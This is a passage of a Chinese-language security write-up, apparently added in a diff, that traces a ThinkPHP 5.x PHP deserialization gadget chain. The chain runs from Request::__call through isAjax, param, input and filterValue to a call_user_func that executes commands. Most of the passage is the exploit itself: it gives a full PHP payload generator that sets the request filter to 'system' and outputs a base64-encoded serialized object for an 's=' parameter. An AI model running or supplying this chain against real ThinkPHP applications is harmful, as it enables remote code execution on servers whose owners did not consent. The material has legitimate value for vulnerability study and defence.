+`$relation->append($name)`可以调用任意类的append方法或__call方法且$name可控
+
+3. __call
+
+`\think\Request::__call`
+
+```php
+    public function __call($method, $args)
+    {
+        if (array_key_exists($method, $this->hook)) {
+            array_unshift($args, $this);
+            return call_user_func_array($this->hook[$method], $args);
+        }
+
+        throw new Exception('method not exists:' . static::class . '->' . $method);
+    }
+```
+
+此时的`$method`和`$args`为
+
+```php
+$args = {数组} [1]
+ 0 = {数组} [0]
+$method = "append"
+```
+
+经过`array_unshift`后,`$args`变更为
+
+```php
+$args = {数组} [2]
+ 0 = {think\Request} [39]
+ 1 = {数组} [0]
+$method = "append"
+```
+
+`$this->hook`可控,因此可以利用`call_user_func_array`调用任意方法,但是此时`$args`的第一个参数为`$this`,需要找到一个可以进行RCE且不受第一个参数影响的方法
+
+4. RCE链
+
+`\think\Request::isAjax`
+
+```php
+    public function isAjax($ajax = false)
+    {
+        $value  = $this->server('HTTP_X_REQUESTED_WITH');
+        $result = 'xmlhttprequest' == strtolower($value) ? true : false;
+
+        if (true === $ajax) {
+            return $result;
+        }
+
+        $result           = $this->param($this->config['var_ajax']) ? true : $result;
+        $this->mergeParam = false;
+        return $result;
+    }
+
+    public function param($name = '', $default = null, $filter = '')
+    {
+        if (!$this->mergeParam) {
+            ...
+        }
+
+        if (true === $name) {
+            // 获取包含文件上传信息的数组
+            $file = $this->file();
+            $data = is_array($file) ? array_merge($this->param, $file) : $this->param;
+            return $this->input($data, '', $default, $filter);
+        }
+    }
+
+    public function file($name = '')
+    {
+        if (empty($this->file)) {
+            $this->file = isset($_FILES) ? $_FILES : [];
+        }
+
+        $files = $this->file;
+        if (!empty($files)) {
+            ...
+        }
+
+        return;
+    }
+
+    public function input($data = [], $name = '', $default = null, $filter = '')
+    {
+        if (false === $name) {
+            // 获取原始数据
+            return $data;
+        }
+
+        $name = (string) $name;
+        ...
+
+        // 解析过滤器
+        $filter = $this->getFilter($filter, $default);
+
+        if (is_array($data)) {
+            array_walk_recursive($data, [$this, 'filterValue'], $filter);
+            ...
+    }
+
+    protected function getFilter($filter, $default)
+    {
+        if (is_null($filter)) {
+            $filter = [];
+        } else {
+            $filter = $filter ?: $this->filter;
+            if (is_string($filter) && false === strpos($filter, '/')) {
+                $filter = explode(',', $filter);
+            } else {
+                $filter = (array) $filter;
+            }
+        }
+
+        $filter[] = $default;
+
+        return $filter;
+    }
+
+    private function filterValue(&$value, $key, $filters)
+    {
+        $default = array_pop($filters);
+
+        foreach ($filters as $filter) {
+            if (is_callable($filter)) {
+                // 调用函数或者方法过滤
+                $value = call_user_func($filter, $value);
+            ...
+    }
+```
+
+在`Request`类中有一个`isAjax`方法,在`isAjax`方法中会对`$this->param()`进行调用且参数`$this->config['var_ajax']`可控
+
+在`param`中将`$this->mergeParam`设置为`true`即可跳过干扰项,而由于`$name`为`$this->config['var_ajax']`,因此将`$this->config['var_ajax']`设置为`true`即可满足条件`true === $name`
+
+在`file`中`$files = $this->file;`因此`$files可控,将`$this->file`设置为空值即可绕过`!empty($files)`使得`param`中的`$file`为`null`
+
+因此`is_array($file)`为`false`,`$data=$this->param`可控,进入到`$this->input()`,此时`$data`参数可控
+
+在`input`中通过`$this->getFilter`获取`$filter`的值,而`$this->filter`可控,因此`$filter`可控
+
+最终进入`filterValue`,利用`call_user_func`达到RCE的目的
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204281633688.png)
+
+payload如下
+
+```php
+<?php
+
+namespace think\process\pipes {
+
+    use think\Process;
+
+    class Windows
+    {
+        private $files;
+        public $pipes;
+        private $fileHandles;
+
+        public function __construct(array $files)
+        {
+            $this->fileHandles = [];
+            $this->pipes = [];
+            $this->files = $files;
+        }
+    }
+}
+
+
+namespace think\model\concern {
+
+    use think\Collection;
+    use think\Exception;
+    use think\Loader;
+    use think\Model;
+    use think\model\Collection as ModelCollection;
+    use think\db\Query;
+    use think\model\Relation;
+    use think\model\relation\BelongsTo;
+    use think\model\relation\BelongsToMany;
+    use think\model\relation\HasMany;
+    use think\model\relation\HasManyThrough;
+    use think\model\relation\HasOne;
+    use think\model\relation\MorphMany;
+    use think\model\relation\MorphOne;
+    use think\model\relation\MorphTo;
+
+    trait Conversion
+    {
+        protected $visible;
+        protected $hidden;
+        protected $append;
+    }
+
+    trait RelationShip
+    {
+        private $relation;
+    }
+
+    trait Attribute
+    {
+        private $data;
+    }
+}
+
+namespace think {
+
+    use InvalidArgumentException;
+    use think\db\Query;
+
+    class Model
+    {
+        use model\concern\Attribute;
+        use model\concern\RelationShip;
+        use model\concern\Conversion;
+
+        public function __construct($relation)
+        {
+            $this->visible = [];
+            $this->hidden = [];
+            $this->data = [];
+            $this->relation = array('misaka' => $relation);
+            $this->append = array('misaka' => array());
+        }
+    }
+}
+
+
+namespace think\model {
+
+    use think\Model;
+
+    class Pivot extends Model
+    {
+        public function __construct($relation)
+        {
+            parent::__construct($relation);
+        }
+    }
+}
+
+namespace think {
+
+    use think\facade\Cookie;
+    use think\facade\Session;
+
+    class Request
+    {
+        protected $hook;
+        protected $filter;
+        protected $config;
+        protected $mergeParam;
+        protected $file;
+        protected $param;
+
+        public function __construct()
+        {
+            $this->hook = array('append' => array($this, 'isAjax'));
+            $this->filter = 'system';
+            $this->mergeParam = true;
+            $this->config['var_ajax'] = true;
+            $this->file = NULL;
+            $this->param =  array('id');
+        }
+    }
+}
+
+namespace {
+    $a = new \think\Request();
+    $b = new \think\model\Pivot($a);
+    $c = new \think\process\pipes\Windows(array($b));
+    echo "s=" . urlencode(base64_encode(serialize($c)));
+}
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204272234122.png)
+
+## 5.2.x版本
+
+>todo
